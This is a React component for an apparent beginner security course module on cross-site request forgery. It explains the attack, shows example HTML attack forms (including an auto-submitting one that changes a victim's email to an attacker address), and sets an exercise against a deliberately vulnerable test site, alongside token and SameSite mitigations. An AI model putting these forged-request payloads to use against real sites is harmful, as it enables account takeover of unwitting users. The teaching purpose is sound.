import React, { useState, useCallback, useRef } from "react";
import { useNavigate } from "react-router-dom";
import {
  FaArrowLeft,
  FaCode,
  FaList,
  FaLink,
  FaEdit,
  FaCheckCircle,
  FaRocket,
  FaBookOpen,
  FaShieldAlt,
} from "react-icons/fa";
import { useAuth } from "../../../context/authContext";

// Define interfaces for type safety
interface UserDetails {
  id: string; // Ensure id is string to avoid TS2322
}

interface UserData {
  userDetails: UserDetails;
}

interface AuthContext {
  userData: UserData | null;
  userToken: string | null;
}

interface FormState {
  assignmentId: number;
  userId: string;
  submissionUrl: string;
  submissionType: "github" | "pdf";
}

const Deet6: React.FC = () => {
  const navigate = useNavigate();
  const { userData, userToken } = useAuth() as AuthContext;
  const inputRef = useRef<HTMLInputElement>(null);

  // State for submission field
  const [submitted, setSubmitted] = useState<boolean>(false);
  const [form, setForm] = useState<FormState>({
    assignmentId: 6, // Unique for Deet6
    userId: String(userData?.userDetails.id ?? ""), // Cast to string to fix TS2322
    submissionUrl: "",
    submissionType: "pdf", // Default to PDF for analytical report
  });

  // Handle input change for submission URL and type
  const handleInputChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
      const { name, value } = e.target;
      setForm((prev) => ({
        ...prev,
        [name]: value,
      }));
    },
    []
  );

  // Handle file upload for PDF submissions
  const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) {
      alert("No file selected. Please choose a file.");
      return;
    }
    if (file.type !== "application/pdf") {
      alert("Please upload a valid PDF file.");
      return;
    }
    // Simulate file upload (replace with actual backend logic)
    const fileUrl = URL.createObjectURL(file);
    setForm((prev) => ({
      ...prev,
      submissionUrl: fileUrl,
    }));
  }, []);

  // Handle form submission
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();

      if (!form.submissionUrl) {
        alert(`Please provide a ${form.submissionType === "github" ? "GitHub link" : "PDF file"}.`);
        return;
      }

      if (!userToken) {
        alert("Authentication error. Please log in again.");
        return;
      }

      try {
        const response = await fetch("http://localhost:8080/api/v1/assignments/submit", {
          method: "POST",
          headers: {
            Authorization: `Bearer ${userToken}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify(form),
        });

        if (!response.ok) {
          const errorData = await response.json();
          throw new Error(errorData.message || "Submission failed.");
        }

        setSubmitted(true);
        alert("Assignment submitted successfully!");
      } catch (error) {
        console.error("Submission error:", error);
        alert(`Failed to submit: ${error instanceof Error ? error.message : "Unknown error"}`);
      }
    },
    [form, userToken]
  );

  return (
    <>
      <section className="bg-white shadow-lg rounded-lg p-4 sm:p-6 md:p-8 mb-8 mx-auto max-w-5xl">
        {/* Back Button */}
        <button
          onClick={() => navigate(-1)}
          className="flex items-center text-gray-600 hover:text-indigo-600 mb-6 transition-all duration-300 ease-in-out transform hover:scale-105 p-2"
          aria-label="Go back"
        >
          <FaArrowLeft className="mr-2 text-lg" />
          Back
        </button>

        {/* Section Heading */}
        <div className="bg-indigo-600 text-white py-4 px-6 rounded-t-lg flex items-center">
          <FaShieldAlt className="mr-3 text-2xl" />
          <h1 className="text-2xl sm:text-3xl font-extrabold uppercase">Cross-Site Request Forgery (CSRF)</h1>
        </div>

        <div className="p-4 sm:p-6">
          {/* Introduction */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
              <FaEdit className="mr-2 text-indigo-600" />
              Introduction to Cross-Site Request Forgery (CSRF)
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Cross-Site Request Forgery (CSRF) is a web application vulnerability, listed in the OWASP Top 10, that tricks authenticated users into performing unintended actions on a trusted website, such as transferring funds or changing account settings, by submitting malicious requests. CSRF exploits the trust a site has in a user’s browser, often through malicious forms or links. This module covers crafting CSRF attacks using tools like Burp Suite and HTML forms, as well as testing mitigations like CSRF tokens and SameSite cookies. These skills are essential for cybersecurity modules like OWASP Top 10 analysis (<code>Deet2</code>) and penetration testing (<code>Dett6</code>).
            </p>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
              Designed for beginners, this module provides detailed explanations, practical examples, and a hands-on exercise to craft a CSRF attack and test mitigations in a test environment. By mastering these techniques, you’ll learn to identify, exploit, and mitigate CSRF risks, preparing you for Capture The Flag (CTF) challenges and real-world security assessments.
            </p>
          </div>

          {/* Understanding CSRF */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaCode className="mr-2 text-indigo-600" />
              Understanding Cross-Site Request Forgery (CSRF)
            </h2>
            <div className="space-y-6">
              {/* What is CSRF? */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  1. What is CSRF?
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  CSRF exploits a website’s trust in an authenticated user’s browser by submitting unauthorized requests, often via malicious forms or links hosted on attacker-controlled sites. The attack relies on the user being logged into the target site.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Impact:</strong> Unauthorized actions (e.g., fund transfers, profile changes), data manipulation.</li>
                  <li><strong>Example:</strong> A malicious form submits a POST request to change a user’s email without their consent.</li>
                  <li><strong>Prerequisites:</strong> User must be authenticated, site must lack CSRF protections.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Malicious CSRF Form
<form action="http://testphp.vulnweb.com/update-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click Me!">
</form>

# User clicks form, submits request unknowingly
`}
                </pre>
              </div>

              {/* Crafting CSRF Attacks */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  2. Crafting CSRF Attacks
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  CSRF attacks involve creating malicious requests that mimic legitimate actions on the target site, often using HTML forms, images, or JavaScript to trigger requests automatically.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Methods:</strong> POST forms, GET URLs, auto-submitting forms with JavaScript.</li>
                  <li><strong>Tools:</strong> Burp Suite to inspect legitimate requests, HTML for attack forms.</li>
                  <li><strong>Delivery:</strong> Host attack on a malicious site or send via phishing links.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Capture Legitimate Request in Burp Suite
POST /update-email HTTP/1.1
Host: testphp.vulnweb.com
email=user@site.com

# Craft Auto-Submitting CSRF Form
<form action="http://testphp.vulnweb.com/update-email" method="POST" id="csrf">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>

# Host on attacker.com, trick user into visiting
`}
                </pre>
              </div>

              {/* Testing CSRF Mitigations */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  3. Testing CSRF Mitigations
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Effective CSRF mitigations ensure requests originate from trusted sources and are intentional, using tokens, cookies, or HTTP method restrictions.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>CSRF Tokens:</strong> Unique, unpredictable tokens included in forms, validated by the server.</li>
                  <li><strong>SameSite Cookies:</strong> Restrict cookies from cross-site requests.</li>
                  <li><strong>HTTP Methods:</strong> Use POST for state-changing actions, verify headers.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Vulnerable Form (No Token)
<form action="/update-email" method="POST">
  <input type="email" name="email">
  <input type="submit">
</form>

# Secure Form (With CSRF Token)
<form action="/update-email" method="POST">
  <input type="hidden" name="_csrf" value="unique-token-123">
  <input type="email" name="email">
  <input type="submit">
</form>

# SameSite Cookie
Set-Cookie: sessionID=abc123; SameSite=Strict
`}
                </pre>
              </div>

              {/* Mitigating CSRF */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  4. Mitigating CSRF
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Preventing CSRF requires implementing robust protections to validate request authenticity and restrict cross-site actions.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>CSRF Tokens:</strong> Generate per-session tokens, validate on server.</li>
                  <li><strong>SameSite Cookies:</strong> Use <code>Strict</code> or <code>Lax</code> to limit cross-site cookie usage.</li>
                  <li><strong>Custom Headers:</strong> Check for headers like <code>X-Requested-With</code> in AJAX requests.</li>
                  <li><strong>User Interaction:</strong> Require re-authentication for sensitive actions.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Express.js CSRF Protection
const csrf = require('csurf');
app.use(csrf());
app.post('/update-email', (req, res) => {
  if (!req.csrfToken()) return res.status(403).send('Invalid CSRF token');
  // Process request
});

# Secure Cookie Configuration
res.cookie('sessionID', 'abc123', { sameSite: 'Strict', httpOnly: true });
`}
                </pre>
              </div>
            </div>
          </div>

          {/* Practical Exercise */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaRocket className="mr-2 text-indigo-600" />
              Practical Exercise: Craft CSRF Attacks and Test Mitigations
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Apply your knowledge by crafting a CSRF attack against a test web application (<code>http://testphp.vulnweb.com</code>) and testing for CSRF mitigations using Burp Suite and browser tools. Document your process and findings in a PDF report (2–3 pages), including screenshots. Optionally, submit a GitHub repository with attack scripts (e.g., malicious HTML form) or Burp Suite logs and a <code>README.md</code>.
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Set up your environment: Install Burp Suite Community Edition and configure your browser to use its proxy (127.0.0.1:8080).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Craft a CSRF Attack:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Visit <code>http://testphp.vulnweb.com</code>, identify a state-changing action (e.g., update email form).</li>
                  <li>Use Burp Suite to capture the legitimate POST request (e.g., <code>/update-email</code>).</li>
                  <li>Create a malicious HTML form mimicking the request (e.g., set <code>email=attacker@evil.com</code>).</li>
                  <li>Host the form locally (e.g., using <code>python -m http.server</code>) and test it in a browser to simulate the attack.</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Test CSRF Mitigations:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Inspect the form for a CSRF token (e.g., <code>&lt;input name="_csrf"&gt;</code>) using Burp Suite or browser developer tools (F12).</li>
                  <li>Resubmit the attack form without the token and check the server response (e.g., 403 Forbidden).</li>
                  <li>Check cookies for <code>SameSite</code> attributes in Burp Suite or browser (F12 - Application - Cookies).</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Write a 2–3 page PDF report including:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Introduction: Explain CSRF and its risks.</li>
                  <li>CSRF Attack: Describe the crafted attack (HTML form, request details) with screenshots of Burp Suite and browser.</li>
                  <li>Mitigation Testing: Detail findings (e.g., token presence, SameSite cookies) with screenshots.</li>
                  <li>Recommendations: Suggest mitigations (e.g., CSRF tokens, SameSite).</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Optional: Create a GitHub repository with the malicious HTML form, Burp Suite logs, or a script (e.g., Python to automate CSRF testing), including a <code>README.md</code>.
              </li>
            </ul>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4">
              Here’s a starter guide for the exercise:
            </p>
            <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
              {`# Install Burp Suite (Kali Linux)
sudo apt update
sudo apt install burpsuite

# Start Burp Suite
burpsuite &

# Configure Browser Proxy (Firefox)
# Preferences > Network Settings > Manual Proxy
# HTTP Proxy: 127.0.0.1, Port: 8080

# Capture Legitimate Request
# In Burp: Proxy > Intercept > Turn on
# Submit form: http://testphp.vulnweb.com/update-email
# Example: email=user@site.com

# Create Malicious CSRF Form (csrf.html)
<form action="http://testphp.vulnweb.com/update-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click Me">
</form>

# Host Locally
python3 -m http.server 8000
# Visit: http://localhost:8000/csrf.html

# Test Mitigation
# In Burp: Inspect form for _csrf token
# Resubmit without token, check response
# Check cookies: F12 > Application > Cookies

# Save Evidence
# In Burp: Right-click request > Save item
# Browser: Screenshot form submission

# Create Report
# Use Word/Google Docs, include screenshots
# Export as PDF
`}
            </pre>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4 italic">
              Complete the exercise, test your setup, and submit your work below! Ensure you only test authorized systems.
            </p>
          </div>

          {/* Submission Section */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaLink className="mr-2 text-indigo-600" />
              Submit Your Work
            </h2>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label
                  className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                  htmlFor="submissionType"
                >
                  Submission Type:
                </label>
                <select
                  name="submissionType"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                  value={form.submissionType}
                  onChange={handleInputChange}
                  aria-label="Select submission type"
                >
                  <option value="github">GitHub Repository Link</option>
                  <option value="pdf">PDF Report</option>
                </select>
              </div>
              {form.submissionType === "github" ? (
                <div>
                  <label
                    className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                    htmlFor="submissionUrl"
                  >
                    Paste Your GitHub Repository Link:
                  </label>
                  <textarea
                    name="submissionUrl"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                    rows={4}
                    placeholder="e.g., https://github.com/username/csrf-attack-lab"
                    value={form.submissionUrl}
                    onChange={handleInputChange}
                    aria-label="GitHub repository link"
                  />
                </div>
              ) : (
                <div>
                  <label
                    className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                    htmlFor="submissionFile"
                  >
                    Upload Your PDF Report:
                  </label>
                  <input
                    type="file"
                    name="submissionFile"
                    accept="application/pdf"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                    onChange={handleFileUpload}
                    ref={inputRef}
                    aria-label="Upload PDF report"
                  />
                </div>
              )}
              <button
                type="submit"
                className="bg-indigo-600 text-white py-2 px-6 rounded-md hover:bg-indigo-700 transition-all duration-300 ease-in-out transform hover:scale-105"
                aria-label="Submit exercise"
              >
                Submit Exercise
              </button>
            </form>
            {submitted && (
              <p className="mt-4 text-green-600 font-medium flex items-center">
                <FaCheckCircle className="mr-2" />
                Your exercise has been submitted successfully!
              </p>
            )}
          </div>

          {/* Resources */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaBookOpen className="mr-2 text-indigo-600" />
              CSRF Resources
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Enhance your skills with these recommended resources:
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://owasp.org/www-community/attacks/csrf"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  OWASP - Cross-Site Request Forgery (CSRF)
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://portswigger.net/web-security/csrf"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  PortSwigger - CSRF Labs
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://tryhackme.com/room/csrf"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  TryHackMe - CSRF Walkthrough
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://www.hacksplaining.com/exercises/csrf"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  Hacksplaining - CSRF Training
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </>
  );
};

export default Deet6;